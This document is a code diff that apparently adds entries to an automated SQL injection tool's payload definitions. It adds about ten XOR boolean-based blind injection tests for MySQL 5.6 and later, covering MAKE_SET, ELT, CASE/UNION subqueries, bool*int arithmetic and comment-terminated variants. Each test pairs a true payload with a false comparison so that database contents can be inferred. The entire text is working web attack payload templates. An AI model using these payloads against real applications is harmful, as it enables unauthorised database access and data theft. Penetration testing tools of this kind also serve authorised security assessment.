@@ -187,6 +187,26 @@ Tag: <test>
         </response>
     </test>
 
+   <test>
+        <title>XOR boolean-based blind - WHERE or HAVING clause</title>
+        <stype>1</stype>
+        <level>1</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>2</where>
+        <vector>XOR [INFERENCE]</vector>
+        <request>
+            <payload>XOR [RANDNUM]=[RANDNUM]</payload>
+        </request>
+        <response>
+            <comparison>XOR [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+        <details>
+             <dbms>MySQL</dbms>
+             <dbms_version>&gt;= 5.6</dbms_version>
+         </details>
+    </test>
+
     <test>
         <title>OR boolean-based blind - WHERE or HAVING clause (NOT)</title>
         <stype>1</stype>
@@ -201,6 +221,26 @@ Tag: <test>
         <response>
             <comparison>OR NOT [RANDNUM]=[RANDNUM1]</comparison>
         </response>
+    </test>
+
+    <test>
+        <title>XOR boolean-based blind - WHERE or HAVING clause (NOT)</title>
+        <stype>1</stype>
+        <level>1</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>2</where>
+        <vector>XOR NOT [INFERENCE]</vector>
+        <request>
+            <payload>XOR NOT [RANDNUM]=[RANDNUM1]</payload>
+        </request>
+        <response>
+            <comparison>XOR NOT [RANDNUM]=[RANDNUM]</comparison>
+        </response>
+        <details>
+             <dbms>MySQL</dbms>
+             <dbms_version>&gt;= 5.6</dbms_version>
+         </details>
     </test>
 
     <test>
@@ -238,6 +278,27 @@ Tag: <test>
     </test>
 
     <test>
+        <title>XOR boolean-based blind - WHERE or HAVING clause (subquery - comment)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>2</where>
+        <vector>XOR [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</vector>
+        <request>
+            <payload>XOR [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</payload>
+            <comment>[GENERIC_SQL_COMMENT]</comment>
+        </request>
+        <response>
+            <comparison>XOR [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</comparison>
+        </response>
+        <details>
+             <dbms>MySQL</dbms>
+             <dbms_version>&gt;= 5.6</dbms_version>
+         </details>
+    </test>
+
+    <test>
         <title>AND boolean-based blind - WHERE or HAVING clause (comment)</title>
         <stype>1</stype>
         <level>2</level>
@@ -272,6 +333,27 @@ Tag: <test>
     </test>
 
     <test>
+        <title>XOR boolean-based blind - WHERE or HAVING clause (comment)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>XOR [INFERENCE]</vector>
+        <request>
+            <payload>XOR [RANDNUM]=[RANDNUM]</payload>
+            <comment>[GENERIC_SQL_COMMENT]</comment>
+        </request>
+        <response>
+            <comparison>XOR [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+        <details>
+             <dbms>MySQL</dbms>
+             <dbms_version>&gt;= 5.6</dbms_version>
+         </details>
+    </test>
+
+    <test>
         <title>OR boolean-based blind - WHERE or HAVING clause (NOT - comment)</title>
         <stype>1</stype>
         <level>4</level>
@@ -286,6 +368,27 @@ Tag: <test>
         <response>
             <comparison>OR NOT [RANDNUM]=[RANDNUM1]</comparison>
         </response>
+    </test>
+
+    <test>
+        <title>XOR boolean-based blind - WHERE or HAVING clause (NOT - comment)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>XOR NOT [INFERENCE]</vector>
+        <request>
+            <payload>XOR NOT [RANDNUM]=[RANDNUM]</payload>
+            <comment>[GENERIC_SQL_COMMENT]</comment>
+        </request>
+        <response>
+            <comparison>XOR NOT [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+        <details>
+             <dbms>MySQL</dbms>
+             <dbms_version>&gt;= 5.6</dbms_version>
+         </details>
     </test>
 
     <test>
@@ -329,6 +432,27 @@ Tag: <test>
     </test>
 
     <test>
+        <title>XOR boolean-based blind - WHERE or HAVING clause (MySQL comment)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>XOR [INFERENCE]</vector>
+        <request>
+            <payload>XOR [RANDNUM]=[RANDNUM]</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <comparison>XOR [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.6</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</title>
         <stype>1</stype>
         <level>3</level>
@@ -345,6 +469,27 @@ Tag: <test>
         </response>
         <details>
             <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>XOR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>XOR NOT [INFERENCE]</vector>
+        <request>
+            <payload>XOR NOT [RANDNUM]=[RANDNUM1]</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <comparison>XOR NOT [RANDNUM]=[RANDNUM]</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.6</dbms_version>
         </details>
     </test>
 
@@ -446,6 +591,26 @@ Tag: <test>
     </test>
 
     <test>
+        <title>MySQL XOR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>2</where>
+        <vector>XOR MAKE_SET([INFERENCE],[RANDNUM])</vector>
+        <request>
+            <payload>XOR MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])</payload>
+        </request>
+        <response>
+            <comparison>XOR MAKE_SET([RANDNUM]=[RANDNUM1],[RANDNUM1])</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.6</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)</title>
         <stype>1</stype>
         <level>4</level>
@@ -484,6 +649,26 @@ Tag: <test>
     </test>
 
     <test>
+        <title>MySQL XOR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>2</where>
+        <vector>XOR ELT([INFERENCE],[RANDNUM])</vector>
+        <request>
+            <payload>XOR ELT([RANDNUM]=[RANDNUM],[RANDNUM1])</payload>
+        </request>
+        <response>
+            <comparison>XOR ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.6</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)</title>
         <stype>1</stype>
         <level>5</level>
@@ -518,6 +703,26 @@ Tag: <test>
         </response>
         <details>
             <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL XOR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>2</where>
+        <vector>XOR ([INFERENCE])*[RANDNUM]</vector>
+        <request>
+            <payload>XOR ([RANDNUM]=[RANDNUM])*[RANDNUM1]</payload>
+        </request>
+        <response>
+            <comparison>XOR ([RANDNUM]=[RANDNUM1])*[RANDNUM1]</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.6</dbms_version>
         </details>
     </test>
 
